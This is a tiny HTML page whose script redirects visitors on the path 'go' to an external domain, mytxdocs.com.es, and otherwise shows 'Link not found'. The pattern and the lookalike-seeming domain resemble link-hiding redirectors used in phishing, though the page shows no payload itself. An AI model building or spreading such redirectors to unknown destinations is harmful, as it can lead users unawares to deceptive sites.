<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Redirecting...</title>
</head>
<body>
<script>
  // 🎯 SINGLE LINK ROUTE
  const routes = {
    "go": "https://mytxdocs.com.es/ga/"
  };

  const path = window.location.pathname.replace("/", "");

  const target = routes[path];

  if (target) {
    window.location.replace(target);
  } else {
    document.body.innerHTML = "Link not found";
  }
</script>
</body>
</html>
